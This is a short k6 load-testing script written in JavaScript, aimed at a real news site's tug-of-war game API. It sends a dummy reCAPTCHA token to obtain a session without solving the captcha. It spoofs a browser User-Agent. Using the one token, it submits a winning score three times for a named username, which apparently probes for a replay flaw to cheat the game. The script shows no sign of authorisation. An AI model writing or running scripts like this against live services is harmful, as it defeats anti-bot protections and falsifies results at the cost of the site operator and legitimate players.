import http from "k6/http";
import { sleep } from "k6";

export default function () {
  const baseUrl = "https://kemerdekaan.liputan6.com";
  const headers = {
      "Content-Type": "application/json",
      "Accept": "application/json",
      "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36",
      "Origin": baseUrl,
      "Referer": `${baseUrl}/games/tariktambang`
  };
  
  // 1. Get Session Token without Captcha (or dummy)
  const sessionUrl = `${baseUrl}/api/games/tariktambang/sessions`;
  const sessionRes = http.post(sessionUrl, JSON.stringify({
    username: "zildjiannesta",
    "g-recaptcha-response": "dummy_token_123"
  }), { headers: headers });
  
  console.log(`Session Status: ${sessionRes.status}`);
  console.log(`Session Body: ${sessionRes.body}`);

  if (sessionRes.status === 201 || sessionRes.status === 200) {
      const token = sessionRes.json().token;
      console.log(`GOT TOKEN: ${token}`);

      // 2. Test submitting score multiple times with same token
      for(let i=0; i<3; i++) {
        const scoreRes = http.post(`${baseUrl}/api/games/tariktambang/scores`, JSON.stringify({
            token: token,
            is_win: true,
            time_left: 30
        }), { headers: headers });
        
        console.log(`Score Submit ${i+1} Status: ${scoreRes.status}`);
        console.log(`Score Submit ${i+1} Body: ${scoreRes.body}`);
        sleep(1);
      }
  }
}
